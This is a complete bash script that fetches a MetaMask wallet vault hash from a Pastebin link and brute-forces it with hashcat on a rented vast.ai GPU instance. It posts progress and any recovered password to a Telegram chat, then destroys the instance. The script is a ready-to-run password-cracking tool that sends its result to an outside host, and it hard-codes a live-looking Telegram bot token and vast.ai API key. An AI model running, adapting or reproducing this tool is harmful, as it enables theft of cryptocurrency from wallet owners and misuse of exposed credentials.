#!/bin/bash

### CONFIGURATION ###
BOT_TOKEN="5883998258:AAFv5_4QjfKmr_pftaH8wVmBeHMfnytYs8U"               # Telegram Bot Token
CHAT_ID="-4660737777"                 # Telegram Chat ID
HASH_MODE=26600                # Metamask PBKDF2-SHA256
HASH_FILE="/root/hash.txt"     # Hash storage path
OUTPUT_FILE="/root/found.txt"  # Cracked passwords
LOG_FILE="/root/hashcat.log"   # Combined log file
CHECKPOINT_FILE="/root/restore" # Session restore
HASH_URL="https://pastebin.com/raw/jGqE9qUb" # Raw Pastebin URL
VAST_API_KEY="ae926ab836ceae7a9036d88a59e86495a90f7402e77e9315b996536502e9047d"    # vast.ai API key

### FUNCTION: Send Telegram Message ###
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$1"
}

### INITIAL SETUP ###
send_telegram "üîë Metamask Cracking Started - Instance $(hostname)"

### DOWNLOAD HASH FILE ###
send_telegram "‚¨áÔ∏è Downloading hash file from Pastebin..."
wget --user-agent="Mozilla/5.0" -O "$HASH_FILE" "$HASH_URL" --quiet

# Validate download
if [ ! -s "$HASH_FILE" ]; then
    send_telegram "‚ùå Download failed! Empty/missing hash file."
    exit 1
fi

# Fix Windows line endings (CRLF -> LF)
sed -i 's/\r$//' "$HASH_FILE"

# Verify Metamask hash format
if ! grep -q "metamask" "$HASH_FILE"; then
    send_telegram "‚ùå Invalid hash format! Missing Metamask identifier"
    exit 1
fi

### HASHCAT SETUP ###
if [ -f "$CHECKPOINT_FILE" ]; then
    CMD="hashcat --restore --session=metamask_session -m $HASH_MODE"
else
    CMD="hashcat -m $HASH_MODE -a 3 $HASH_FILE '?a?a?a?a?a?a?a?a' \
          --session=metamask_session \
          --restore-file-path=$CHECKPOINT_FILE \
          --restore-timer=300 \
          --status --status-timer=60 \
          --outfile=$OUTPUT_FILE"
fi

### START CRACKING ###
send_telegram "üî• Hashcat initialized! Starting attack..."
$CMD > "$LOG_FILE" 2>&1 &
PID=$!

### PROGRESS UPDATES ###
while kill -0 $PID 2>/dev/null; do
    # Get machine-readable status
    hashcat --machine-readable --status > /tmp/hashcat_status
    
    # Parse metrics
    PROGRESS=$(awk -F',' '/STATUS/ {print $7}' /tmp/hashcat_status)
    SPEED=$(awk -F',' '/STATUS/ {print $11 $10}' /tmp/hashcat_status | numfmt --to=si)
    REJECTED=$(awk -F',' '/STATUS/ {print $9}' /tmp/hashcat_status)
    
    # Format message
    MSG=$(printf "‚åõ Progress: %s%%\n‚ö° Speed: %sH/s\nüö´ Rejected: %s" \
          "$PROGRESS" "$SPEED" "$REJECTED")
    
    send_telegram "$MSG"
    sleep 600 # 10-minute intervals
done

### FINAL RESULT ###
if [ -s "$OUTPUT_FILE" ]; then
    PASSWORD=$(awk -F':' 'END{print $NF}' "$OUTPUT_FILE")
    send_telegram "‚úÖ Success! Password: $PASSWORD"
else
    send_telegram "‚ùå No password found"
fi

### INSTANCE CLEANUP ###
send_telegram "üßπ Destroying instance $(hostname)"
vastai destroy instance $(hostname) --api-key "$VAST_API_KEY"
